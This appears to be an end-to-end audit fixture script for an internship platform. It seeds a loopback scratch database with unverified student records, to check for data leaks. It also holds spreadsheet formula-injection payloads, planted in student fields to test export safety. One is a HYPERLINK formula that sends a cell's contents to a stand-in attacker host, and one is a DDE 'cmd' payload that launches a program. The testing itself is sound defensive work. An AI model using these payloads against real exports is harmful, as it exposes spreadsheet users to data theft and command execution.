// WP2 scratch fixtures: turns some seeded JKLU students into *claimed* (unverified) ones that still carry data (score, CGPA,
// offers, meetings, last seen) and plants formula-injection strings in verified students' text fields.
// Loopback scratch DB only (findtern_ca_wp2 on 55490). Idempotent. Usage: DATABASE_URL=... node e2e/college-audit/wp2-fixtures.mjs
import pg from "pg";
const url = process.env.DATABASE_URL ?? "";
if (!/^postgresql:\/\/findtern@127\.0\.0\.1:5549\d\/findtern_ca_wp2$/.test(url)) throw new Error("refusing: DATABASE_URL must be the wp2 scratch DB");
const c = new pg.Client({ connectionString: url, options: "-c TimeZone=UTC" });
await c.connect();
const cur = (await c.query("select current_database() db, inet_server_port() port")).rows[0];
console.log("[fixtures]", JSON.stringify(cur));
const college = (await c.query("select college_id from college_admins where email='tpo@jklu.edu.in'")).rows[0].college_id;
const ids = async (sql, p = []) => (await c.query(sql, p)).rows.map((r) => r.user_id);
const base = `from college_memberships m join users u on u.id=m.user_id join intern_onboarding o on o.user_id=m.user_id where m.college_id=$1 and m.left_at is null`;
// 8 claimed with an offer + score; 3 with a requested drive call; 3 with a scheduled interview; 2 with only a score.
const withOffer = await ids(`select m.user_id ${base} and jsonb_typeof(o.extra_data->'findternScore')='number' and exists(select 1 from proposals p where p.intern_id=m.user_id and p.status<>'draft') order by u.email limit 8`, [college]);
const withCall = await ids(`select m.user_id ${base} and exists(select 1 from college_drive_meetings d where d.user_id=m.user_id and d.status='requested') order by u.email limit 3`, [college]);
const withIv = await ids(`select m.user_id ${base} and exists(select 1 from interviews i where i.intern_id=m.user_id and i.status='scheduled') order by u.email limit 3`, [college]);
const scoreOnly = await ids(`select m.user_id ${base} and jsonb_typeof(o.extra_data->'findternScore')='number' and m.user_id <> all($2) order by u.email desc limit 2`, [college, withOffer]);
const claimed = [...new Set([...withOffer, ...withCall, ...withIv, ...scoreOnly])];
await c.query("update college_memberships set status='claimed', verified_by=null where user_id = any($1) and college_id=$2", [claimed, college]);
console.log("[fixtures] claimed", claimed.length);
// last seen = now for the claimed ones so a leaked last-seen is obvious
await c.query("update college_presence set last_seen_at = (now() at time zone 'utc') where user_id = any($1)", [claimed]);
// formula injection in verified students
const verified = await ids(`select m.user_id ${base} and m.status='verified' and m.user_id <> all($2) order by u.email limit 8`, [college, claimed]);
const evil = ['=HYPERLINK("http://evil.example/?x="&A1,"Click")', "+SUM(1+1)*cmd|' /C calc'!A0", "-2+3+cmd", "@SUM(1,1)", "\t=1+1", "\r=1+1", "=1+1", "normal, with \"quotes\" and, commas"];
for (let i = 0; i < verified.length; i++) {
  const id = verified[i], e = evil[i];
  await c.query("update intern_onboarding set skills = $2::jsonb, city = $3, preferred_locations = $4::jsonb, extra_data = jsonb_set(jsonb_set(jsonb_set(extra_data, '{emergencyName}', to_jsonb($3::text)), '{academics,degree}', to_jsonb($3::text)), '{academics,specialization}', to_jsonb($3::text)) where user_id=$1", [id, JSON.stringify([e, "ok"]), e, JSON.stringify([e])]);
}
await c.query("update users set first_name = $2 where id=$1", [verified[0], "=1+1"]);
console.log("[fixtures] evil strings on", verified.length, "verified students");
const [{ n }] = (await c.query("select count(*) n from college_memberships where college_id=$1 and status='claimed'", [college])).rows;
console.log("[fixtures] claimed in college now:", n);
await c.end();
